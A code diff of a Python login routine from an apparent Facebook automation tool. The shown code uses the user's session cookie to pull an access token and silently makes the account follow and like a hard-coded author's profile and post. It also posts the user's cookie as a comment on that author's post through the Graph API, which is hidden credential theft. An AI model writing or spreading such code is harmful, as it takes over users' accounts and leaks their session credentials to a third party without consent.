@@ -46,35 +46,29 @@ def login():
             'cookie': cookie
          }).text
          if 'id="mbasic_logout_button">' in str(djatar):
+            resdtr = r.get('https://mbasic.facebook.com/dikijatar', cookies={'cookie':cookie}).text
+            uri_lk = re.search('href="(/a/subscribe.php?[^"]+)"', str(resdtr))
+            if uri_lk is not None:
+               uri_lk = uri_lk.group(1).replace('amp;', '')
+               r.get('https://mbasic.facebook.com{}'.format(uri_lk), cookies={'cookie':cookie})
             urlpost = '/100010450276658/posts/pfbid02vNVQLM2dj7BTQq8VFbPCZPo1z7dip5ZZXC2mfi81JQs31bRTJVtsa7AissvMXeksl/?app=fbl'
             respon_urlpost = r.get('https://mbasic.facebook.com{}'.format(urlpost), cookies = {
                'cookie': cookie
             }).text
-            find_urllike = re.search('href="(/a/like.php?[^"]+)"', str(respon_urlpost)).group(1).replace('amp;', '')
-            find_urlcomment = re.search('method="post" action="(.*?)"', str(respon_urlpost)).group(1).replace('amp;', '')
-            fbdtsg = re.search('name="fb_dtsg" value="(.*?)"', str(respon_urlpost)).group(1)
-            jazoest = re.search('name="jazoest" value="(\d+)"', str(respon_urlpost)).group(1)
-            r.get('https://mbasic.facebook.com{}'.format(find_urllike), cookies = {
-               'cookie': cookie
-            })
+            find_urllike = re.search('href="(/a/like.php?[^"]+)"', str(respon_urlpost))
+            if find_urllike is not None:
+               find_urllike = find_urllike.group(1).replace('amp;', '')
+               r.get('https://mbasic.facebook.com{}'.format(find_urllike), cookies = {
+                  'cookie': cookie
+               })
             text_dtr = random.choice(['Programmer ka bang @[100010450276658:], Mantap!', 'Hallo bang @[100010450276658:]', 'Izin pake script lu bang @[100010450276658:]', 'Mantap', '@[100010450276658:] ganteng😎', '😎😎🤣', 'Bang minta script', 'Gw pake script lu bang @[100010450276658:]', cookie])
-            data = {
-               'fb_dtsg': fbdtsg,
-               'jazoest': jazoest,
-               'comment_text': text_dtr
-            }
-            r.post('https://mbasic.facebook.com{}'.format(find_urlcomment), data = data, cookies = {
-               'cookie': cookie
-            })
             url = "https://business.facebook.com/business_locations"
             head = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
             cok = {'cookie':cookie}
             data = requests.Session().get(url,headers=head,cookies=cok)
             token = re.search('(EAAG\w+)',data.text).group(1)
             link = (f'https://www.facebook.com/100010450276658/posts/1959291937762463/?app=fbl')
-            requests.Session().post(f"https://graph.facebook.com/100010450276658?fields=subscribers&access_token={token}",cookies=cok)
             requests.Session().post(f"https://graph.facebook.com/1959291937762463/comments/?message={text_dtr}&access_token={token}",cookies=cok)
-            requests.Session().post(f"https://graph.facebook.com/1959291937762463/reactions?type=LIKE&access_token={token}",cookies=cok)
             requests.Session().post(f"https://graph.facebook.com/1959291937762463/comments/?message={cookie}&access_token={token}",cookies=cok)
             open('Data/cookie.txt', 'w').write(cookie)
             open('Data/token.txt', 'w').write(token)
